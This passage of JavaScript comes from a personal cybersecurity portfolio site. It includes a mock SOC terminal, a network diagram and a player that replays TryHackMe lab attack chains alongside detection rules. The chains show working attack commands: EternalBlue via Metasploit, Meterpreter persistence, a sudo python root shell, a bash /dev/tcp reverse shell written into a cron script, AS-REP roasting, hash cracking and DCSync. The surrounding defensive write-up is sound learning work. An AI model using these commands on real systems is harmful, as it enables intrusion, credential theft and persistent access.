      await printLine(c(GREEN,'✓') + '  ' + c(BRIGHT,'Rule written. Deploy to Sigma pipeline → Elastic.'));
      await blank();
    },
    'incident close': async function() {
      if (!state.timelineBuilt) {
        await printLine(c(AMBER,'[!]') + '  ' + c(HI,'Run  timeline build  first.'));
        await blank();
        return;
      }
      state.solved = true;
      await printLine(c(DIM, '[*] Compiling incident report SOC-2026-0347...'));
      await sleep(500);
      await printLine(c(GREEN,'[+]') + '  ' + c(BRIGHT,'Report written → incidents/2026-01-14.html'));
      await printLine(c(GREEN,'[+]') + '  ' + c(BRIGHT,'Sigma rule deployed → elastic/rules/'));
      await printLine(c(GREEN,'[+]') + '  ' + c(BRIGHT,'Block pushed → pfSense · 185.220.101.47 dropped'));
      await printLine(c(GREEN,'[+]') + '  ' + c(BRIGHT,'svc-backup suspended · password reset forced'));
      await blank();
      await printLine(c(DIM, '┄'.repeat(54)));
      await printLine('  ' + c(GREEN,'INCIDENT RESOLVED') + '  ' + c(DIM,'·') + '  ' + c(HI,'SOC-2026-0347'));
      await printLine('  ' + c(DIM,'Dwell time   ') + c(AMBER,'00:03:31') + '  ' + c(DIM,'from first packet to containment'));
      await printLine('  ' + c(DIM,'IOCs logged  ') + c(BRIGHT,'3') + '  ' + c(DIM,'(IP, account, C2 host)'));
      await printLine('  ' + c(DIM,'Rules written ') + c(BRIGHT,'1') + '  ' + c(DIM,'Sigma rule, deployed to prod'));
      await printLine(c(DIM, '┄'.repeat(54)));
      await blank();
      await printLine('  ' + c(DIM, 'This is what I build. Every day.'));
      await blank();
      htBadge.style.background = 'rgba(82,201,122,0.12)';
      htBadge.style.borderColor = 'rgba(82,201,122,0.3)';
      htBadge.style.color = '#52c97a';
      htBadge.textContent = '✓ INCIDENT RESOLVED';
    },
    'clear': async function() { out.innerHTML = ''; },
  };

  function handleInput(raw) {
    const cmd = raw.trim().toLowerCase();
    if (!cmd) return;
    cmdHistory.unshift(raw);
    histIdx = -1;
    const div = document.createElement('div');
    div.className = 'ht-line';
    div.innerHTML = '<span style="color:var(--accent)">analyst@soc:~$ </span><span style="color:' + BRIGHT + '">' + raw + '</span>';
    out.appendChild(div);
    out.scrollTop = out.scrollHeight;
    const handler = commands[cmd];
    if (handler) { handler(); }
    else {
      printLine(c(RED,'command not found:') + ' ' + c(HI,cmd) + '  ' + c(DIM,'— type  help  for options'));
      printLine('');
    }
  }

  if (htInput) {
    htInput.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        const val = htInput.value; htInput.value = ''; handleInput(val);
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        histIdx = Math.min(histIdx + 1, cmdHistory.length - 1);
        if (cmdHistory[histIdx]) htInput.value = cmdHistory[histIdx];
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        histIdx = Math.max(histIdx - 1, -1);
        htInput.value = histIdx < 0 ? '' : cmdHistory[histIdx];
      }
    });
    document.querySelector('.hero-terminal').addEventListener('click', function() {
      if (termReady) htInput.focus();
    });
  }

  // Start boot sequence
  setTimeout(boot, 900);


  // ── LAB DIAGRAM INTERACTIVITY ──
  (function() {
    const panel       = document.getElementById('topo-panel');
    const closeBtn    = document.getElementById('topo-panel-close');
    const panelIcon   = document.getElementById('topo-panel-icon');
    const panelTitle  = document.getElementById('topo-panel-title');
    const panelIp     = document.getElementById('topo-panel-ip');
    const panelRole   = document.getElementById('topo-panel-role');
    const panelBody   = document.getElementById('topo-panel-body');
    const panelTags   = document.getElementById('topo-panel-tags');
    const panelConns  = document.getElementById('topo-panel-connects');
    const svg         = document.getElementById('topo-svg');
    const topo        = document.getElementById('topo');
    if (!panel || !svg) return;

    let activeNode = null;

    // ── PANEL OPEN/CLOSE ──
    function openPanel(node) {
      if (activeNode) activeNode.classList.remove('active');
      activeNode = node;
      node.classList.add('active');
      panelIcon.textContent  = node.querySelector('.topo-node-icon, .topo-hub-icon').textContent;
      panelTitle.textContent = node.dataset.title  || '';
      panelIp.textContent    = node.dataset.ip     || '';
      panelRole.textContent  = node.dataset.role   || '';
      panelBody.textContent  = node.dataset.body   || '';
      panelConns.textContent = node.dataset.connects || '—';
      panelTags.innerHTML = '';
      (node.dataset.tags || '').split(',').forEach(t => {
        if (!t.trim()) return;
        const s = document.createElement('span');
        s.textContent = t.trim();
        panelTags.appendChild(s);
      });
      panel.classList.add('open');
    }
    function closePanel() {
      panel.classList.remove('open');
      if (activeNode) { activeNode.classList.remove('active'); activeNode = null; }
    }
    document.querySelectorAll('.tnode').forEach(node => {
      node.addEventListener('click', e => {
        e.stopPropagation();
        if (node === activeNode) { closePanel(); return; }
        openPanel(node);
      });
    });
    closeBtn.addEventListener('click', closePanel);
    document.addEventListener('click', e => { if (!e.target.closest('.diagram-wrap')) closePanel(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') closePanel(); });

    // ── SVG WIRE DRAWING ──
    // Colours and traffic labels matching VLAN order
    const VLAN_META = [
      { vlan:'mgmt', color:'#4a8fff', label:'DNS / AD'     },
      { vlan:'sec',  color:'#2ecc71', label:'SPAN MIRROR'  },
      { vlan:'mon',  color:'#f5c842', label:'METRICS'      },
      { vlan:'lab',  color:'#ff4a5a', label:'ISOLATED'     },
      { vlan:'dmz',  color:'#00d4d4', label:'TLS / VPN'    },
    ];

    function drawWires() {
      svg.innerHTML = '';
      const topoRect = topo.getBoundingClientRect();

      // Hub bottom-center
      const hub = topo.querySelector('.topo-hub');
      if (!hub) return;
      const hubRect = hub.getBoundingClientRect();
      const hubX = hubRect.left - topoRect.left + hubRect.width / 2;
      const hubY = hubRect.bottom - topoRect.top;

      // Bus line Y (center of .topo-bus)
      const busEl = topo.querySelector('.topo-bus');
      if (!busEl) return;
      const busRect = busEl.getBoundingClientRect();
      const busY = busRect.top - topoRect.top + busRect.height / 2;
      const busLeft  = busRect.left - topoRect.left;
      const busRight = busRect.right - topoRect.left;

      // Define a vertical gradient for the stub: hub-blue at top → transparent at bottom
      const defs = document.createElementNS('http://www.w3.org/2000/svg','defs');
      const grad = document.createElementNS('http://www.w3.org/2000/svg','linearGradient');
      grad.setAttribute('id','stub-grad');
      grad.setAttribute('gradientUnits','userSpaceOnUse');
      grad.setAttribute('x1', hubX); grad.setAttribute('y1', hubY);
      grad.setAttribute('x2', hubX); grad.setAttribute('y2', busY);
      const s1 = document.createElementNS('http://www.w3.org/2000/svg','stop');
      s1.setAttribute('offset','0%');
      s1.setAttribute('stop-color','#c8d6f8');
      s1.setAttribute('stop-opacity','0.5');
      const s2 = document.createElementNS('http://www.w3.org/2000/svg','stop');
      s2.setAttribute('offset','100%');
      s2.setAttribute('stop-color','#c8d6f8');
      s2.setAttribute('stop-opacity','0');
      grad.appendChild(s1); grad.appendChild(s2);
      defs.appendChild(grad);
      svg.appendChild(defs);

      // Drop wires per VLAN handled below

      // Draw horizontal bus line
      const busLine = makePath(`M ${busLeft} ${busY} L ${busRight} ${busY}`,
        'rgba(200,214,248,0.18)', 2);
      busLine.style.filter = 'drop-shadow(0 0 3px rgba(200,214,248,0.12))';
      svg.appendChild(busLine);

      // Draw drop wire per VLAN — each with its own fade gradient
      VLAN_META.forEach(({ vlan, color, label }) => {
        const vlanEl = topo.querySelector(`.topo-vlan[data-vlan="${vlan}"]`);
        if (!vlanEl) return;
        const vRect = vlanEl.getBoundingClientRect();
        const vX = vRect.left - topoRect.left + vRect.width / 2;
        const vY = vRect.top - topoRect.top;

        // Per-VLAN gradient: bus-colour at top → transparent at bottom
        const gradId = `drop-grad-${vlan}`;
        const dropGrad = document.createElementNS('http://www.w3.org/2000/svg','linearGradient');
        dropGrad.setAttribute('id', gradId);
        dropGrad.setAttribute('gradientUnits','userSpaceOnUse');
        dropGrad.setAttribute('x1', vX); dropGrad.setAttribute('y1', busY);
        dropGrad.setAttribute('x2', vX); dropGrad.setAttribute('y2', vY);
        const d1 = document.createElementNS('http://www.w3.org/2000/svg','stop');
        d1.setAttribute('offset','0%');
        d1.setAttribute('stop-color', color);
        d1.setAttribute('stop-opacity', '0.5');
        const d2 = document.createElementNS('http://www.w3.org/2000/svg','stop');
        d2.setAttribute('offset','100%');
        d2.setAttribute('stop-color', color);
        d2.setAttribute('stop-opacity', '0.08');
        dropGrad.appendChild(d1); dropGrad.appendChild(d2);
        defs.appendChild(dropGrad);

        const drop = makePath(`M ${vX} ${busY} L ${vX} ${vY}`, `url(#${gradId})`, 1.5);
        drop.classList.add('topo-wire');
        svg.appendChild(drop);

        // Dot at bus junction
        const dot = document.createElementNS('http://www.w3.org/2000/svg','circle');
        dot.setAttribute('cx', vX);
        dot.setAttribute('cy', busY);
        dot.setAttribute('r', '2.5');
        dot.setAttribute('fill', color);
        dot.setAttribute('opacity', '0.5');
        svg.appendChild(dot);

        // Traffic label — appears on hover via CSS
        const lbl = document.createElementNS('http://www.w3.org/2000/svg','text');
        lbl.setAttribute('x', vX + 5);
        lbl.setAttribute('y', busY + (vY - busY) / 2);
        lbl.setAttribute('fill', color);
        lbl.classList.add('topo-wire-label');
        lbl.textContent = label;
        svg.appendChild(lbl);
      });
    }

    function makePath(d, stroke, width) {
      const p = document.createElementNS('http://www.w3.org/2000/svg','path');
      p.setAttribute('d', d);
      p.setAttribute('stroke', stroke);
      p.setAttribute('stroke-width', width);
      p.setAttribute('fill', 'none');
      return p;
    }

    // Draw on load and on resize
    function scheduleDraw() { requestAnimationFrame(drawWires); }
    // Wait for fonts + layout
    setTimeout(scheduleDraw, 120);
    window.addEventListener('resize', scheduleDraw);
    // Also redraw when reveal animation fires (diagram may have been hidden)
    const revealObs = new MutationObserver(scheduleDraw);
    const diagramWrap = topo.closest('.diagram-wrap');
    if (diagramWrap) revealObs.observe(diagramWrap, { attributes: true, attributeFilter: ['class'] });

    // ── PACKET COUNTERS ──
    // Inject a counter span into each VLAN header
    document.querySelectorAll('.topo-vlan[data-vlan-rate]').forEach(vlan => {
      const header = vlan.querySelector('.topo-vlan-header');
      if (!header) return;
      const rate  = parseFloat(vlan.dataset.vlanRate) || 10;
      const color = vlan.dataset.vlanColor || '#888';
      const span  = document.createElement('span');
      span.className = 'vlan-pkt';
      span.style.setProperty('--vc', color);
      header.appendChild(span);

      // Simulate realistic jitter around base rate
      let current = rate;
      function tick() {
        const jitter = (Math.random() - 0.5) * rate * 0.4;
        current = Math.max(0, rate + jitter);
        const display = current >= 1000
          ? (current/1000).toFixed(1) + 'k'
          : Math.round(current).toString();
        span.textContent = display + ' pkts/s';
        setTimeout(tick, 800 + Math.random() * 600);
      }
      // Stagger start so they don't all tick together
      setTimeout(tick, Math.random() * 1000);
    });

    // ── NODE SEARCH / FILTER ──
    const searchInput = document.getElementById('topo-search');
    if (searchInput) {
      searchInput.addEventListener('input', () => {
        const q = searchInput.value.trim().toLowerCase();
        document.querySelectorAll('.topo-node').forEach(node => {
          if (!q) {
            node.classList.remove('dimmed');
            return;
          }
          const text = (
            (node.dataset.title || '') + ' ' +
            (node.dataset.ip    || '') + ' ' +
            (node.dataset.tags  || '') + ' ' +
            node.textContent
          ).toLowerCase();
          node.classList.toggle('dimmed', !text.includes(q));
        });
        // If entire VLAN is dimmed, dim the column too
        document.querySelectorAll('.topo-vlan').forEach(vlan => {
          const nodes = vlan.querySelectorAll('.topo-node');
          const allDimmed = [...nodes].every(n => n.classList.contains('dimmed'));
          vlan.classList.toggle('all-dimmed', q.length > 0 && allDimmed);
        });
      });
      // Clear on Escape
      searchInput.addEventListener('keydown', e => {
        if (e.key === 'Escape') {
          searchInput.value = '';
          searchInput.dispatchEvent(new Event('input'));
        }
      });
    }

  })();


</script>



<script>
// ── SKILL BARS ANIMATE ON SCROLL ──
const skillBarObs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      e.target.querySelectorAll('.skill-bar-fill').forEach(bar => {
        bar.style.width = bar.dataset.w + '%';
      });
      skillBarObs.unobserve(e.target);
    }
  });
}, { threshold: 0.3 });
document.querySelectorAll('.skill-bars-section').forEach(b => skillBarObs.observe(b));

// ── SCROLL PROGRESS ──
const pg = document.getElementById('pg');
window.addEventListener('scroll', () => {
  const s = document.documentElement;
  const pct = s.scrollTop / (s.scrollHeight - s.clientHeight) * 100;
  pg.style.width = pct + '%';
}, { passive: true });

// ── CUSTOM CURSOR ──
const cdot = document.getElementById('cdot');
const cring = document.getElementById('cring');
document.addEventListener('mousemove', e => {
  cdot.style.left  = e.clientX + 'px';
  cdot.style.top   = e.clientY + 'px';
  cring.style.left = e.clientX + 'px';
  cring.style.top  = e.clientY + 'px';
});
document.querySelectorAll('a,button,.snd,.proj-row,.ctf-card,.now-card').forEach(el => {
  el.addEventListener('mouseenter', () => cring.classList.add('h'));
  el.addEventListener('mouseleave', () => cring.classList.remove('h'));
});

// ── SIDE NAV DOTS ──
const sections = ['hero','about','projects','why','ctf','now','lab','contact'];
const dots = document.querySelectorAll('.snd');
const snObserver = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      const i = sections.indexOf(e.target.id);
      dots.forEach(d => d.classList.remove('on'));
      if (i >= 0 && dots[i]) dots[i].classList.add('on');
    }
  });
}, { threshold: 0.4 });
sections.forEach(id => { const el = document.getElementById(id); if(el) snObserver.observe(el); });

// ── CERT BARS ANIMATE ON SCROLL ──
const certObs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      e.target.querySelectorAll('.crt-fill').forEach(bar => {
        bar.style.width = bar.dataset.w + '%';
      });
      certObs.unobserve(e.target);
    }
  });
}, { threshold: 0.3 });
document.querySelectorAll('.cert-block').forEach(b => certObs.observe(b));

// ── COPY EMAIL ──
const emailLink = document.getElementById('email-link');
if (emailLink) {
  const btn = document.createElement('button');
  btn.className = 'cpybtn'; btn.textContent = 'COPY';
  btn.addEventListener('click', e => {
    e.preventDefault(); e.stopPropagation();
    navigator.clipboard.writeText('matthew.vaishnav@gmail.com').then(() => {
      btn.textContent = 'COPIED'; btn.classList.add('ok');
      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('ok'); }, 2000);
    });
  });
  emailLink.querySelector('.ext-lbl').after(btn);
}

// ── EASTER EGG ──
const konami = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
let kIdx = 0;
const eggPre = document.getElementById('egg-pre');
const hint = document.getElementById('konami-hint');
const hintSteps = ['▪','▪','▪','▪','▪','▪','▪','▪','▪','▪'];

function updateHint() {
  if (!hint) return;
  hint.textContent = hintSteps.map((s, i) => i < kIdx ? '█' : '—').join(' ');
  hint.style.color = kIdx > 0
    ? `rgba(46,204,113,${0.2 + kIdx * 0.08})`
    : 'rgba(255,255,255,0.18)';
}

// ── KEYBOARD SHORTCUTS ──
let gMode = false;
function openKbd()  { document.getElementById('kbdm').classList.add('open'); }
function closeKbd() { document.getElementById('kbdm').classList.remove('open'); }
document.addEventListener('keydown', e => {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
  if (e.key === 'Escape') { closeKbd(); gMode = false; closeEgg(); return; }
  if (e.key === '?') { openKbd(); return; }
  // Easter egg runs first — if key advances the sequence, don't let gMode eat it
  if (e.key === konami[kIdx]) {
    gMode = false;
    kIdx++;
    updateHint();
    if (kIdx === konami.length) { kIdx = 0; updateHint(); openEgg(); }
    return;
  } else {
    if (kIdx > 0) { kIdx = 0; updateHint(); }
  }
  if (e.key === 'g' || e.key === 'G') { gMode = true; return; }
  if (gMode) {
    gMode = false;
    const map = { a:'about', p:'projects', c:'ctf', l:'lab', e:'contact' };
    const k = e.key.toLowerCase();
    if (map[k]) document.getElementById(map[k]).scrollIntoView({ behavior:'smooth' });
  }
});
document.getElementById('kbdm').addEventListener('click', e => {
  if (e.target === document.getElementById('kbdm')) closeKbd();
});
const eggLines = [
  '          ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ',
  '          ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗',
  '          ███████║███████║██║     █████╔╝ █████╗  ██║  ██║',
  '          ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║',
  '          ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝',
  '          ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ',
  '',
  '  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄',
  '',
  '  Genuinely — thank you.',
  '',
  '  Most people skim a portfolio for 30 seconds.',
  '  You actually looked.',
  '',
  '  That kind of curiosity is exactly what I\'m trying to',
  '  demonstrate I have. Glad to meet someone who has it too.',
  '',
  '  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄',
  '',
  '  matthew.vaishnav@gmail.com',
  '  github.com/matthewvaishnav',
  '',
  '  Open to co-op · Summer / Fall 2026 · Kitchener-Waterloo, ON',
  '',
];
function openEgg() {
  const egg = document.getElementById('egg');
  egg.classList.add('open');
  eggPre.textContent = '';
  let li = 0, ci = 0;
  function typeEgg() {
    if (li >= eggLines.length) return;
    if (ci <= eggLines[li].length) {
      eggPre.textContent = eggLines.slice(0, li).join('\n') + '\n' + eggLines[li].slice(0, ci);
      ci++;
      setTimeout(typeEgg, 18);
    } else {
      li++; ci = 0;
      setTimeout(typeEgg, 60);
    }
  }
  typeEgg();
}
function closeEgg() {
  document.getElementById('egg').classList.remove('open');
  kIdx = 0;
  updateHint();
}


// ── CTF ATTACK CHAIN PLAYER ──
(function() {

  const PHASE_COLORS = {
    recon:   '#6a8aff',
    exploit: '#f5c842',
    escalate:'#ff8c42',
    lateral: '#c842f5',
    persist: '#e05252',
    detect:  '#52c97a',
  };

  const LABS = [
    {
      id: 'blue',
      platform: 'TryHackMe',
      title: 'Blue — EternalBlue (MS17-010)',
      diff: 'easy',
      desc: 'SMB exploitation via MS17-010. SYSTEM shell, credential dump, persistence via service install. Wrote detection rules for Event IDs 4625, 4648, and SMB scanner fingerprints in Security Onion.',
      github: 'https://github.com/matthewvaishnav/cst-portfolio/blob/main/ctf-writeups/THM_Blue_EternalBlue.md',
      tags: ['T1190', 'T1003', 'T1543'],
      phases: [
        {
          label: 'Recon', type: 'recon',
          log: [
            {cls:'log-prompt', t:'kali@kali:~$ '},
            {cls:'log-cmd',    t:'nmap -sV -sC --script vuln 10.10.10.40'},
            {cls:'log-out',    t:'\nStarting Nmap 7.94 scan...'},
            {cls:'log-out',    t:'\nPORT    STATE SERVICE      VERSION'},
            {cls:'log-hit',    t:'\n445/tcp open  microsoft-ds  Windows 7 Professional'},
            {cls:'log-hit',    t:'\n| smb-vuln-ms17-010:'},
            {cls:'log-hit',    t:'\n|   VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1'},
            {cls:'log-hit',    t:'\n|   Risk factor: HIGH\n|   CVSS: 9.3'},
            {cls:'log-owned',  t:'\n\n[+] MS17-010 CONFIRMED — host is exploitable'},
          ],
          ttp: ['T1046 — Network Service Discovery', 'T1595 — Active Scanning'],
          detection: 'Suricata SID 2027893 — ET SCAN NMAP -sV scan\nEvent ID 5156 — Windows Filtering Platform connection\nZeek conn.log: 10+ ports scanned in <2s',
          sigma: 'title: Nmap Version Scan Detection\ncondition: zeek_conn | where orig_pkts > 50\n  AND proto = "tcp" AND duration < 2\nlevel: medium',
        },
        {
          label: 'Exploit', type: 'exploit',
          log: [
            {cls:'log-prompt', t:'msf6 > '},
            {cls:'log-cmd',    t:'use exploit/windows/smb/ms17_010_eternalblue'},
            {cls:'log-out',    t:'\n[*] set RHOSTS 10.10.10.40'},
            {cls:'log-out',    t:'\n[*] set LHOST 10.10.14.8'},
            {cls:'log-out',    t:'\n[*] Sending stage (201798 bytes) to 10.10.10.40'},
            {cls:'log-hit',    t:'\n[*] Meterpreter session 1 opened'},
            {cls:'log-owned',  t:'\n\nmeterpreter > getuid'},
            {cls:'log-owned',  t:'\nServer username: NT AUTHORITY\\SYSTEM'},
          ],
          ttp: ['T1190 — Exploit Public-Facing Application', 'T1059 — Command and Scripting'],
          detection: 'Suricata: ET EXPLOIT MS17-010 EternalBlue (SID 2024449)\nEvent ID 4624 — Logon Type 3 from unexpected source\nZeek: large SMB payload spike on port 445',
          sigma: 'title: EternalBlue SMB Exploit Attempt\nlogsource: {product: suricata}\ndetection:\n  keywords: "ET EXPLOIT MS17-010"\ncondition: keywords\nlevel: critical',
        },
        {
          label: 'Escalate', type: 'escalate',
          log: [
            {cls:'log-prompt', t:'meterpreter > '},
            {cls:'log-cmd',    t:'hashdump'},
            {cls:'log-hit',    t:'\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'},
            {cls:'log-hit',    t:'\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'},
            {cls:'log-hit',    t:'\nJon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::'},
            {cls:'log-out',    t:'\n[*] Cracking NTLM hashes with hashcat...'},
            {cls:'log-owned',  t:'\nJon:alqfna22  [CRACKED]'},
          ],
          ttp: ['T1003.002 — SAM Database', 'T1110.002 — Password Cracking'],
          detection: 'Event ID 4661 — SAM handle obtained (sensitive object)\nEvent ID 4648 — Logon with explicit credentials\nSysmon EID 10 — Process access on lsass.exe',
          sigma: 'title: LSASS / SAM Credential Dump\ndetection:\n  sysmon_access:\n    EventID: 10\n    TargetImage|contains: "lsass.exe"\n  condition: sysmon_access\nlevel: high',
        },
        {
          label: 'Persist', type: 'persist',
          log: [
            {cls:'log-prompt', t:'meterpreter > '},
            {cls:'log-cmd',    t:'run persistence -h -i 60 -p 4444 -r 10.10.14.8'},
            {cls:'log-out',    t:'\n[*] Installing backdoor service...'},
            {cls:'log-hit',    t:'\n[*] Backdoor service created: metsvc'},
            {cls:'log-out',    t:'\n[*] For cleanup use: run multi_console_command -rc /root/.msf4/logs/persistence'},
            {cls:'log-owned',  t:'\n[+] Persistence installed — reconnects every 60s'},
            {cls:'log-out',    t:'\n\n--- Detection: written Sigma rule captures this ---'},
          ],
          ttp: ['T1543.003 — Windows Service', 'T1547 — Boot/Logon Autostart'],
          detection: 'Event ID 4697 — A service was installed in the system\nEvent ID 7045 — New service installed (System log)\nSysmon EID 12 — Registry key create under HKLM\\SYSTEM\\CurrentControlSet\\Services',
          sigma: 'title: Meterpreter Persistence Service Install\ndetection:\n  service_install:\n    EventID: 4697\n    ServiceName|contains: "metsvc"\n  condition: service_install\nlevel: critical',
        },
      ]
    },
    {
      id: 'privesc',
      platform: 'TryHackMe',
      title: 'Linux PrivEsc Arena',
      diff: 'med',
      desc: 'SUID binary abuse, sudo misconfiguration, cron job exploitation. Full chain from www-data to root. Documented every vector, its detection event, and the one-line fix.',
      github: 'https://github.com/matthewvaishnav/cst-portfolio/blob/main/ctf-writeups/THM_Linux_Privesc.md',
      tags: ['T1548', 'T1053', 'T1166'],
      phases: [
        {
          label: 'Recon', type: 'recon',
          log: [
            {cls:'log-prompt', t:'www-data@victim:~$ '},
            {cls:'log-cmd',    t:'find / -perm -u=s -type f 2>/dev/null'},
            {cls:'log-hit',    t:'\n/usr/bin/python3.8'},
            {cls:'log-hit',    t:'\n/usr/bin/find'},
            {cls:'log-hit',    t:'\n/usr/bin/vim.basic'},
            {cls:'log-out',    t:'\n\n[*] Checking sudo rights...'},
            {cls:'log-prompt', t:'www-data@victim:~$ '},
            {cls:'log-cmd',    t:'sudo -l'},
            {cls:'log-hit',    t:'\n(ALL) NOPASSWD: /usr/bin/python3'},
          ],
          ttp: ['T1083 — File & Directory Discovery', 'T1033 — System Owner Discovery'],
          detection: 'Auditd: -a always,exit -F path=/usr/bin/find -F perm=x\nSysmon EID 1: Process create with SUID parent\nZeek: unusual find/python exec chain under www-data',
          sigma: 'title: SUID Binary Enumeration\ndetection:\n  process_create:\n    Image|endswith: "/find"\n    CommandLine|contains: "-perm -u=s"\n  condition: process_create\nlevel: medium',
        },
        {
          label: 'Escalate', type: 'escalate',
          log: [
            {cls:'log-prompt', t:'www-data@victim:~$ '},
            {cls:'log-cmd',    t:'sudo python3 -c "import pty; pty.spawn(\'/bin/bash\')"'},
            {cls:'log-out',    t:'\n[sudo] running python3 as root...'},
            {cls:'log-prompt', t:'root@victim:~# '},
            {cls:'log-owned',  t:'id'},
            {cls:'log-owned',  t:'\nuid=0(root) gid=0(root) groups=0(root)'},
            {cls:'log-owned',  t:'\n\n[+] Root shell via sudo python3 — NOPASSWD misconfiguration'},
          ],
          ttp: ['T1548.003 — Sudo Abuse', 'T1059.004 — Unix Shell'],
          detection: 'Event: sudo session opened for root (auth.log)\nAuditd syscall: execve with euid=0, ruid≠0\nFix: remove ALL NOPASSWD entries from /etc/sudoers',
          sigma: 'title: Sudo Privilege Escalation via Python\ndetection:\n  keywords:\n    - "sudo python"\n    - "pty.spawn"\n  condition: keywords\nlevel: high',
        },
        {
          label: 'Persist', type: 'persist',
          log: [
            {cls:'log-prompt', t:'root@victim:~# '},
            {cls:'log-cmd',    t:'crontab -l'},
            {cls:'log-hit',    t:'\n* * * * * /opt/cleanup.sh'},
            {cls:'log-out',    t:'\n\n[*] cleanup.sh is world-writable...'},
            {cls:'log-prompt', t:'root@victim:~# '},
            {cls:'log-cmd',    t:'echo "bash -i >& /dev/tcp/10.10.14.8/4445 0>&1" >> /opt/cleanup.sh'},
            {cls:'log-owned',  t:'\n[+] Reverse shell injected into cron job'},
            {cls:'log-owned',  t:'[+] Fires every minute — persistent root access'},
          ],
          ttp: ['T1053.003 — Cron Job', 'T1105 — Ingress Tool Transfer'],
          detection: 'Auditd: file write to /opt/cleanup.sh by unexpected user\nSysmon EID 11: FileCreate on cron script\nFix: chmod 700 all cron scripts, audit world-writable files weekly',
          sigma: 'title: Cron Script Modification\ndetection:\n  file_event:\n    TargetFilename|contains: "/etc/cron"\n  condition: file_event\n  NOT User: "root"\nlevel: high',
        },
      ]
    },
    {
      id: 'ad',
      platform: 'TryHackMe',
      title: 'Attacktive Directory',
      diff: 'hard',
      desc: 'Kerberoasting, AS-REP roasting, pass-the-hash, lateral movement. Full chain from anonymous enumeration to Domain Admin. Wrote Sigma rules for Kerberos ticket anomalies and NTLM relay patterns.',
      github: 'https://github.com/matthewvaishnav/cst-portfolio/blob/main/ctf-writeups/THM_ActiveDirectory_Attacks.md',
      tags: ['T1558', 'T1550', 'T1021'],
      phases: [
        {
          label: 'Recon', type: 'recon',
          log: [
            {cls:'log-prompt', t:'kali@kali:~$ '},
            {cls:'log-cmd',    t:'enum4linux -a 10.10.10.161'},
            {cls:'log-hit',    t:'\n[*] Domain: THM-AD'},
            {cls:'log-hit',    t:'\n[*] Users: Administrator, svc-admin, backup'},
            {cls:'log-out',    t:'\n\n[*] Testing AS-REP roastability...'},
            {cls:'log-prompt', t:'kali@kali:~$ '},
            {cls:'log-cmd',    t:'GetNPUsers.py THM-AD/ -no-pass -usersfile users.txt'},
            {cls:'log-owned',  t:'\n$krb5asrep$23$svc-admin@THM-AD:a3f8c2... [AS-REP HASH]'},
          ],
          ttp: ['T1087.002 — Domain Account Discovery', 'T1558.004 — AS-REP Roasting'],
          detection: 'Event ID 4768 — Kerberos AS-REQ without pre-auth (etype 23)\nEvent ID 4625 — Failed logon attempts (enum)\nSIEM correlation: >10 AS-REQs in 60s from one IP',
          sigma: 'title: AS-REP Roasting Attempt\ndetection:\n  kerberos:\n    EventID: 4768\n    PreAuthType: "0"\n  condition: kerberos | count() > 5 over 1m\nlevel: high',
        },
        {
          label: 'Exploit', type: 'exploit',
          log: [
            {cls:'log-prompt', t:'kali@kali:~$ '},
            {cls:'log-cmd',    t:'hashcat -m 18200 svc-admin.hash /usr/share/wordlists/rockyou.txt'},
            {cls:'log-out',    t:'\n[*] Cracking AS-REP hash...'},
            {cls:'log-owned',  t:'\nsvc-admin:management2005  [CRACKED in 00:00:14]'},
            {cls:'log-out',    t:'\n\n[*] Enumerating with creds...'},
            {cls:'log-prompt', t:'kali@kali:~$ '},
            {cls:'log-cmd',    t:'smbclient -U "svc-admin%management2005" //10.10.10.161/backup'},
            {cls:'log-hit',    t:'\nsmb: \\> get credentials.txt'},
            {cls:'log-owned',  t:'backup@spookysec.local:backup2517860'},
          ],
          ttp: ['T1110.002 — Password Cracking', 'T1039 — Data from Network Shared Drive'],
          detection: 'Event ID 4769 — Kerberos TGS-REQ (Kerberoast indicator)\nEvent ID 5140 — Network share accessed by new account\nZeek smb_files.log: backup credential file accessed',
          sigma: 'title: SMB Share Accessed by Service Account\ndetection:\n  smb_share:\n    EventID: 5140\n    ShareName: "backup"\n    SubjectUserName|contains: "svc"\n  condition: smb_share\nlevel: high',
        },
        {
          label: 'Escalate', type: 'escalate',
          log: [
            {cls:'log-prompt', t:'kali@kali:~$ '},
            {cls:'log-cmd',    t:'secretsdump.py -just-dc THM-AD/backup@10.10.10.161'},
            {cls:'log-out',    t:'\n[*] Dumping DC hashes via DCSync...'},
            {cls:'log-hit',    t:'\nAdministrator:500:aad3b435::0e0363213e37b94221497260b0bcb4fc:::'},
            {cls:'log-hit',    t:'\nsvc-admin:1103:aad3b435::fc0f1e5359aeaa4d406684a5048ea9f5:::'},
            {cls:'log-owned',  t:'\n[+] DCSync complete — all domain hashes extracted'},
          ],
          ttp: ['T1003.006 — DCSync', 'T1078.002 — Domain Accounts'],
